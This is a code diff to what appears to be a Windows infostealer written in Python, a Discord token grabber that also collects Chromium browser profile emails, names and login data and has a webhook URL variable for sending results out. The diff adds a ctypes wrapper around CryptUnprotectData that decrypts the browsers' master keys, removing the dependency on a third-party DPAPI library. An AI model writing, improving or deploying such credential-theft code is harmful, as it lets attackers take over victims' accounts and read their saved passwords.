@@ -1,5 +1,8 @@
 WEBHOOK_URL = ""
-import requests, getpass, sqlite3, shutil, socket, base64, dpapi, json, mss, re, os
+import requests, getpass, sqlite3, shutil, socket, base64, json, mss, re, os
+import Crypto, ctypes
+from ctypes import *
+from ctypes.wintypes import *
 from Crypto.Cipher import AES
 
 LOCAL = os.getenv("LOCALAPPDATA")
@@ -19,6 +22,49 @@ DISCORD_DIRS = [
 ]
 
 data = ""
+
+class DATA_BLOB(ctypes.Structure):
+    _fields_ = [
+        ("cbData", DWORD),
+        ("pbData", LPBYTE)
+    ]
+
+def decryptData(encryptedData):
+    crypt32 = ctypes.windll.crypt32
+    crypt32.CryptUnprotectData.restype = BOOL
+    crypt32.CryptUnprotectData.argtypes = [
+        ctypes.POINTER(DATA_BLOB),
+        ctypes.POINTER(ctypes.c_wchar_p),
+        ctypes.POINTER(DATA_BLOB),
+        LPVOID,
+        LPVOID,
+        DWORD,
+        ctypes.POINTER(DATA_BLOB)
+    ]
+    
+    encryptedBlob = DATA_BLOB()
+    encryptedBlob.cbData = len(encryptedData)
+    buffer = ctypes.create_string_buffer(encryptedData)
+    encryptedBlob.pbData = ctypes.cast(buffer, LPBYTE)
+    
+    decryptedBlob = DATA_BLOB()
+    
+    result = crypt32.CryptUnprotectData(
+        ctypes.byref(encryptedBlob),
+        None,
+        None,
+        None,
+        None,
+        0,
+        ctypes.byref(decryptedBlob)
+    )
+    
+    if result:
+        decryptedData = ctypes.string_at(decryptedBlob.pbData, decryptedBlob.cbData)
+        return decryptedData
+    else:
+        error_code = ctypes.GetLastError()
+        raise Exception(f"Data decryption failed with error code: {error_code}")
 
 def getUserInfo(token:str):
     if not token: return False
@@ -41,8 +87,7 @@ def findDiscordTokens():
         encryptedKey = d["os_crypt"]["encrypted_key"]
         encryptedKey = encryptedKey.encode("utf-8")
         encryptedKey = base64.b64decode(encryptedKey)[5:]
-        #secretKey = win32crypt.CryptUnprotectData(encryptedKey, None, None, None, 0)[1]
-        secretKey = dpapi.unprotect(encryptedKey)
+        secretKey = decryptData(encryptedKey)
         for file in os.listdir(leveldb):
             if not file.endswith((".log",".ldb")):
                 continue
@@ -79,8 +124,7 @@ def findChromiumDatas():
         encryptedKey = d["os_crypt"]["encrypted_key"]
         encryptedKey = encryptedKey.encode("utf-8")
         encryptedKey = base64.b64decode(encryptedKey)[5:]
-        #secretKey = win32crypt.CryptUnprotectData(encryptedKey, None, None, None, 0)[1]
-        secretKey = dpapi.unprotect(encryptedKey)
+        secretKey = decryptData(encryptedKey)
         for profileName in profiles:
             profile = profiles[profileName]
             resultStr += profileName+":\n    Email:"+profile["user_name"]+"\n    Name:"+profile["gaia_name"]+"\n    LoginData:\n"
